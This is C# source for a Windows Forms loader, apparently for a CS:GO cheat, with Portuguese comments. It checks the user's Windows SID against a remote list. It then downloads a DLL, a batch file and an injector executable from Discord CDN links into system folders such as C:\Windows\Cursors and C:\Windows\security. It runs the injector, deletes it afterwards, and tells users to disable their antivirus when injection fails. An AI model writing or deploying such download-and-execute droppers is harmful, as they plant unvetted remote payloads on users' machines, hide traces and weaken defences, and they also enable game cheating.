
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Net;
using System.IO;
using System.Diagnostics;

namespace WindowsFormsApp2
{
    public partial class Tex : Form
    {
        public Tex()
        {
            InitializeComponent();
        }

        string HWID;

        private void Form1_Load(object sender, EventArgs e)
        {
            HWID = System.Security.Principal.WindowsIdentity.GetCurrent().User.Value; 
            textBox1.Text = HWID;
            textBox1.ReadOnly = true;
            checkonline();
        }

        private void button1_Click(object sender, EventArgs e)
        {
            WebClient wb = new WebClient();
            string hwid = wb.DownloadString(""); // link do seu banco de dados aqui
            if (hwid.Contains(textBox1.Text))
            {
                Process[] TargetProcess1 = Process.GetProcessesByName("csgo"); //
                {

                    if (TargetProcess1.Length == 0)
                    {
                        MessageBox.Show("Processo não encontrado");
                        return;
                    }
                    else
                    {
                        string caminho = @"C:\Windows\Cursors\yourdll.dll";
                        string caminho2 = @"C:\Windows\security\lol.bat";
                        string caminho3 = @"C:\inj.exe";
                        try
                        {
                            
                            string dll = wb.DownloadString("");  //link da sua dll aqui
                            wb.DownloadFile(dll, caminho);
                            wb.DownloadFile("https://cdn.discordapp.com/attachments/780881666469134346/795108630272671744/shell_1.bat", caminho2);
                            wb.DownloadFile("https://cdn.discordapp.com/attachments/780881666469134346/795098062799634432/RandoInjector.exe", caminho3);
                        }
                        catch
                        {

                            MessageBox.Show("Erro com os Servidores");
                            return;
                        }

                        try
                        {
                            System.Diagnostics.Process.Start(caminho3);
                            MessageBox.Show("Injected!");
                            if (File.Exists(caminho3) == true)
                            {
                                File.Delete(caminho3);
                            }
                        }
                        catch
                        {

                            MessageBox.Show("Erro ao Injetar, desative seu antivirus!");
                            Application.Exit();
                            return;
                        }
                        Application.Exit();
                    }

                }
            }
            else
            {
                MessageBox.Show("Você não tem acesso");
            }
            
            

            
        }

        private void checkonline()
        {
            //Checking if the user can get a response from "https://google.com/"
            try
            {
                using (var client = new WebClient())
                {
                    using (client.OpenRead("https://google.com/"))
                    {
                        label1.ForeColor = Color.Green;
                        label1.Text = ("Online");
                    }
                }
            }
            catch
            {
                label1.ForeColor = Color.Red;
                label1.Text = ("Offline");
                Application.Exit();
            }
        }

        private void button2_Click(object sender, EventArgs e)
        {
            Clipboard.SetText(HWID);
            button2.Enabled = false;
            button2.Text = "Copied";
        }
    }
}
